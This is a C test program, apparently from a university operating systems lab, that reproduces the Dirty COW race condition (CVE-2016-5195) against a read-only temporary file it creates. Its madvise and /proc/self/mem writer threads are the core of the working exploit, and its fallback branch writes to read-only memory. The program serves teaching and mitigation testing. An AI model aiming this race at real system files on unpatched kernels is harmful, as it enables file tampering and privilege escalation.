/**
 * @file test_race_cow.c
 * @brief PoC: Simulador de Condicion de Carrera Tipo Dirty COW (CVE-2016-5195)
 * @course Sistemas Operativos - EAFIT 2026-B
 * 
 * Este programa reproduce el patrón clásico de condición de carrera entre
 * la llamada al sistema madvise(MADV_DONTNEED) y escrituras concurrentes
 * sobre una región mapeada en modo privado (MAP_PRIVATE).
 * 
 * Objetivo:
 * Validar si la concurrencia entre el descarte de páginas en la MMU y
 * la gestión de banderas Copy-On-Write (COW) puede inducir corrupción
 * en la memoria del kernel o en el archivo base.
 * 
 * En kernels contemporáneos (Linux 5.x / 6.x) con el parche FOLL_COW y
 * en nuestro controlador sec_mmap con ->page_mkwrite instrumentado,
 * la carrera se mitiga de forma determinista y el almacenamiento base permanece íntegro.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>
#include <errno.h>

#define NUM_ITERATIONS 50000
#define TARGET_TEXT    "ARCHIVO_BASE_INTEGRO_NO_CORRUPTIBLE_2026B\n"

static void *map_addr = NULL;
static size_t map_size = 4096;
static volatile int keep_running = 1;
static int mem_fd = -1;
static unsigned long write_attempts = 0;
static unsigned long madvise_count = 0;

/**
 * Hilo 1: Descarta constantemente la entrada de la tabla de paginas (PTE)
 * forzando a la MMU a repetir el fallo de pagina Copy-On-Write.
 */
static void *madvise_worker(void *arg)
{
    (void)arg;
    for (int i = 0; i < NUM_ITERATIONS && keep_running; i++) {
        if (madvise(map_addr, map_size, MADV_DONTNEED) == 0) {
            madvise_count++;
        }
        usleep(1); /* Breve intercalacion para favorecer concurrencia */
    }
    return NULL;
}

/**
 * Hilo 2: Intenta escribir concurrentemente mediante /proc/self/mem
 * buscando aprovechar una ventana donde el kernel haya roto el COW pero la PTE
 * no este fijada con la bandera correcta.
 */
static void *writer_worker(void *arg)
{
    (void)arg;
    char payload[] = "EXPLOIT_DIRTY_COW_CORRUPCION_DETECTADA!!";
    size_t payload_len = strlen(payload);

    for (int i = 0; i < NUM_ITERATIONS && keep_running; i++) {
        /* Escritura via descriptor /proc/self/mem */
        if (mem_fd >= 0) {
            lseek(mem_fd, (off_t)(uintptr_t)map_addr, SEEK_SET);
            if (write(mem_fd, payload, payload_len) > 0) {
                write_attempts++;
            }
        } else {
            /* Escritura directa en memoria de usuario */
            char *p = (char *)map_addr;
            p[0] = 'Z';
            write_attempts++;
        }
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    char test_file[] = "/tmp/sec_cow_race_XXXXXX";
    int fd;
    pthread_t th_madvise, th_writer;

    (void)argc;
    (void)argv;

    printf("====================================================================\n");
    printf("[PoC 2] SIMULACION DE CONDICION DE CARRERA (COW + MADVISE)\n");
    printf("====================================================================\n");

    /* 1. Crear archivo objetivo en disco */
    fd = mkstemp(test_file);
    if (fd < 0) {
        perror("mkstemp");
        return 1;
    }
    if (write(fd, TARGET_TEXT, strlen(TARGET_TEXT)) < 0) {
        perror("write");
    }
    fchmod(fd, 0444); /* Solo lectura para simular archivo de sistema */

    printf("[Paso 1] Archivo objetivo creado: %s\n", test_file);
    printf("         Permisos: 0444 (Solo lectura). Tamano: %lu bytes.\n", strlen(TARGET_TEXT));

    /* 2. Mapear en modo MAP_PRIVATE (Lectura) */
    map_addr = mmap(NULL, map_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map_addr == MAP_FAILED) {
        perror("mmap");
        close(fd);
        unlink(test_file);
        return 1;
    }
    printf("[Paso 2] Archivo mapeado en espacio virtual: %p (MAP_PRIVATE)\n", map_addr);

    /* 3. Abrir /proc/self/mem para simular ataque de inyeccion forzada */
    mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0) {
        printf("[AVISO] /proc/self/mem no disponible con O_RDWR (%s). Usando acceso directo.\n",
               strerror(errno));
    } else {
        printf("[Paso 3] Descriptor /proc/self/mem abierto con exito (fd=%d).\n", mem_fd);
    }

    printf("[Paso 4] Disparando hilos concurrentes (%d iteraciones)...\n", NUM_ITERATIONS);
    printf("         - Hilo 1: madvise(MADV_DONTNEED) continuo.\n");
    printf("         - Hilo 2: /proc/self/mem write concurrente.\n");

    pthread_create(&th_madvise, NULL, madvise_worker, NULL);
    pthread_create(&th_writer, NULL, writer_worker, NULL);

    pthread_join(th_madvise, NULL);
    pthread_join(th_writer, NULL);
    keep_running = 0;

    printf("[Paso 5] Carrera finalizada. Estadisticas de ejecucion:\n");
    printf("         - Invocaciones madvise(MADV_DONTNEED) exitosas : %lu\n", madvise_count);
    printf("         - Intentos de escritura concurrentes          : %lu\n", write_attempts);

    /* 4. Comprobacion de integridad del archivo base en disco */
    char check_buffer[128] = {0};
    lseek(fd, 0, SEEK_SET);
    ssize_t bytes_read = read(fd, check_buffer, sizeof(check_buffer) - 1);
    (void)bytes_read;

    printf("--------------------------------------------------------------------\n");
    printf("[EVALUACION DE SEGURIDAD] Contenido actual del archivo en disco:\n");
    printf(">>> \"%s\"\n", check_buffer);
    printf("--------------------------------------------------------------------\n");

    if (strcmp(check_buffer, TARGET_TEXT) == 0) {
        printf("===> [RESULTADO]: DEFENSA EXITOSA Y SISTEMA PROTEGIDO!\n");
        printf("     El archivo base NO sufrio corrupcion ni alteracion.\n");
        printf("     Las mitigaciones del kernel (FOLL_COW y aislamiento de VMA)\n");
        printf("     impidieron la violacion de seguridad bajo condiciones de carrera.\n");
    } else {
        printf("===> [ALERTA DE SEGURIDAD]: CONDICION DE CARRERA EXPLOTADA!\n");
        printf("     El archivo protegido fue modificado ilegitimamente.\n");
    }

    /* Limpieza */
    if (mem_fd >= 0) close(mem_fd);
    munmap(map_addr, map_size);
    close(fd);
    unlink(test_file);

    printf("====================================================================\n");
    return 0;
}

